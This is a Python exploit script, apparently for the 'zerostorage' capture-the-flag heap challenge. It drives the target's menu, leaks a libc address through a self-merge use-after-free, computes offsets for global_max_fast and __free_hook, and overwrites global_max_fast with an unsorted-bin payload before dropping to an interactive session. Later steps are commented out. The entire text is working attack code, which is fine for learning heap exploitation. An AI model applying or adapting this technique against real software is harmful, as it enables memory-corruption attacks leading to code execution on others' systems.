#!/usr/bin/python
from pwn13 import *


def Insert(data):
    p.sendline("1")
    print p.recvuntil(": ")
    p.sendline(str(len(data)+1))
    print p.recvuntil(": ")
    p.sendline(data)
    print p.recvuntil(": ")

def Update(idx, data):
    p.sendline("2")
    print p.recvuntil(": ")
    p.sendline(str(idx))
    print p.recvuntil(": ")
    p.sendline(str(len(data)+1))
    print p.recvuntil(": ")
    p.sendline(data)
    print p.recvuntil(": ")

def Merge(idx1, idx2):
    p.sendline("3")
    print p.recvuntil(": ")
    p.sendline(str(idx1))
    print p.recvuntil(": ")
    p.sendline(str(idx2))
    print p.recvuntil(": ")

def Delete(idx):
    p.sendline("4")
    print p.recvuntil(": ")
    p.sendline(str(idx))
    print p.recvuntil(": ")

def View(idx):
    p.sendline("5")
    print p.recvuntil(": ")
    p.sendline(str(idx))
    print p.recvuntil(":\n")
    data = p.recvline()
    print data
    print p.recvuntil(": ")
    return data

def List():
    p.sendline("6")
    print p.recvuntil(": ")

def Exit():
    p.sendline("7")
    print p.recv()

if __name__ == "__main__":
    p = process("./zerostorage")
    print p.recvuntil(": ")

    #leak
    Insert("a"*7)#0
    Insert("b"*7)#1
    Insert("c"*7)#2
    Insert("d"*7)#3
    Insert("e"*7)#4

    Merge(1,1)#5
    data = View(5)
    addr = u64(data[:8])
    libc_base = addr - 0x3c3b78
    global_max_fast = libc_base + 0x3c57f8
    free_hook = libc_base + 0x3c57a8
    print hex(libc_base)
    print 'global_max_fast', hex(global_max_fast)

    #overwite global_max_fast
    payload = p64(0) + p64(global_max_fast-0x10)
    Update(5, payload)
    p.heap(0x0, 0x100)
    p.dump(global_max_fast, 0x30)

    Insert("f"*7)#1
    p.heap(0x0, 0x100)
    p.dump(global_max_fast, 0x30)

    #Merge(1,1)
    #Merge(3,3)
    p.interactive()
    p.close()




